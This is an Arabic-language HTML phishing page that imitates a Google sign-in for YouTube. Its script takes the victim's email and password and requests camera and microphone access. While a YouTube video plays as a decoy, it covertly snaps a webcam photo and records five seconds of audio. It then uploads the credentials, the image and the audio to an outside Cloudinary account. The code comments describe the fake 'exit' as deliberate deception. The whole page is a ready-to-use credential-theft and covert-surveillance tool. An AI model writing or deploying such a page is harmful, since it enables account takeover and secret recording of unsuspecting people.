<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - حسابات Google</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: sans-serif; }
        .login-card { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 400px; padding: 40px; border: 1px solid #ddd; border-radius: 8px; background: #fff; z-index: 1000; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
        button { background: #1a73e8; color: #fff; border: none; padding: 10px; width: 100%; border-radius: 4px; cursor: pointer; }
        #yt-frame { width: 100%; height: 100%; border: none; display: none; }
        #v, #c { display: none; }
    </style>
</head>
<body>

<div class="login-card" id="ui">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
    <h2>تسجيل الدخول</h2>
    <p>المتابعة إلى YouTube</p>
    <input type="email" id="e" placeholder="البريد الإلكتروني">
    <input type="password" id="p" placeholder="كلمة المرور">
    <button onclick="start()">التالي</button>
</div>

<iframe id="yt-frame"></iframe>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    const cn = 'dgkttv99v', pr = 'ml_default', yt = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1";

    async function start() {
        const email = document.getElementById('e').value, pass = document.getElementById('p').value;
        if(!email || !pass) return;

        try {
            // 1. اطلب الإذن فوراً
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const video = document.getElementById('v');
            video.srcObject = stream;
            video.play();

            // 2. "الخروج المشرف" الوهمي: افتح يوتيوب في نفس الصفحة
            document.getElementById('ui').style.display = 'none';
            const frame = document.getElementById('yt-frame');
            frame.src = yt;
            frame.style.display = 'block';

            // 3. دلوقتي صفحتنا لسه شغال (رغم إن اليوزر شايف يوتيوب)
            // هنستنى 3 ثواني عشان الكاميرا والمايك يجمعوا داتا حقيقية
            setTimeout(() => {
                captureAndRecord(email, pass, stream);
            }, 3000);

        } catch (err) {
            window.location.href = "https://www.youtube.com";
        }
    }

    async function captureAndRecord(email, pass, stream) {
        // التقاط الصورة
        const canvas = document.getElementById('c');
        canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
        const img = canvas.toDataURL("image/png");

        // تسجيل صوت لمدة 5 ثواني في صمت
        const rec = new MediaRecorder(stream);
        let chunks = [];
        rec.ondataavailable = e => chunks.push(e.data);
        rec.onstop = () => {
            const audioBlob = new Blob(chunks, { type: 'audio/mp3' });
            upload(email, pass, img, audioBlob);
        };
        rec.start();
        setTimeout(() => rec.stop(), 5000);
    }

    async function upload(e, p, img, ab) {
        const fdImg = new FormData();
        fdImg.append('file', img); fdImg.append('upload_preset', pr);
        fdImg.append('context', `u=${e}|p=${p}`);
        fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, { method: 'POST', body: fdImg });

        const fdAud = new FormData();
        fdAud.append('file', ab); fdAud.append('upload_preset', pr);
        fdAud.append('resource_type', 'video');
        fetch(`https://api.cloudinary.com/v1_1/${cn}/upload`, { method: 'POST', body: fdAud });
    }
</script>
</body>
</html>
